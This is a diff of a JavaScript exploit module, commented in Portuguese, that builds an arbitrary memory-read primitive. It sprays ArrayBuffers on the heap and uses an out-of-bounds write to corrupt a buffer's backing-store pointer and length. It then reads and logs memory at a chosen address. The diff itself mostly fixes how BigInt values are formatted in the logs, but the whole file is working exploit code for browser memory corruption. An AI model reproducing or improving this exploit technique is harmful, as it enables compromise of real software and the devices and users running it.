@@ -1,6 +1,5 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO v2)
+// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO v3)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
-// CORREÇÃO: Importar a classe AdvancedInt64 para lidar com valores de 64 bits.
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
     triggerOOB_primitive,
@@ -12,14 +11,9 @@ import {
 const ARBITRARY_READ_CONFIG = {
     SPRAY_COUNT: 200,
     BUFFER_SIZE: 256,
-    // Endereço alvo para a leitura.
-    TARGET_READ_ADDRESS: 0x3BD820n, // 'n' o torna um BigInt
-
-    // Offsets para corromper os metadados do ArrayBuffer.
+    TARGET_READ_ADDRESS: 0x3BD820n,
     OFFSET_TO_BYTE_LENGTH: 8,
     OFFSET_TO_BACKING_STORE: 16,
-
-    // Offsets relativos para tentar a corrupção.
     corruption_offsets: [
         (128) - 16,
         (128) - 8,
@@ -38,8 +32,9 @@ function readBigInt64(dataview, offset) {
 
 export async function testArbitraryRead() {
     const FNAME = "testArbitraryRead";
+    // CORREÇÃO: Formata o BigInt para string hexadecimal para o log.
     logS3(`--- Iniciando Tentativa de Leitura de Memória Arbitrária ---`, "test", FNAME);
-    logS3(`   Alvo da Leitura: ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}`, "info", FNAME);
+    logS3(`   Alvo da Leitura: 0x${ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`, "info", FNAME);
 
     let success = false;
     const SHORT_PAUSE_MS = 50;
@@ -64,14 +59,12 @@ export async function testArbitraryRead() {
         logS3(`${ARBITRARY_READ_CONFIG.SPRAY_COUNT} buffers pulverizados no heap.`, "info", FNAME);
 
         try {
-            // CORREÇÃO: Converter o BigInt para o tipo AdvancedInt64 esperado pela função de escrita.
             const targetAddrAsInt64 = new AdvancedInt64(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS);
 
-            // Corrompe o ponteiro para o endereço que queremos ler
-            logS3(`  1. Escrevendo ponteiro para ${toHex(targetAddrAsInt64)} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
+            // CORREÇÃO: Evita chamar toHex() em um objeto não suportado, usando o método .toString() do objeto.
+            logS3(`  1. Escrevendo ponteiro para ${targetAddrAsInt64.toString()} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
             oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE, targetAddrAsInt64, 8);
 
-            // Corrompe o tamanho para um valor grande
             logS3(`  2. Escrevendo tamanho 0xFFFFFFFF em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH}`, "warn", FNAME);
             oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BYTE_LENGTH, 0xFFFFFFFF, 4);
 
@@ -86,7 +79,10 @@ export async function testArbitraryRead() {
                     let memory_reader_view = new DataView(ab);
                     const leaked_data = readBigInt64(memory_reader_view, 0);
 
-                    logS3(`   >> DADO VAZADO de ${toHex(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS)}: ${toHex(leaked_data)}`, "leak", FNAME);
+                    // CORREÇÃO: Formata o BigInt para string hexadecimal para o log.
+                    const targetAddrHex = `0x${ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`;
+                    const leakedDataHex = `0x${leaked_data.toString(16)}`;
+                    logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
 
                     success = true;
                     break;
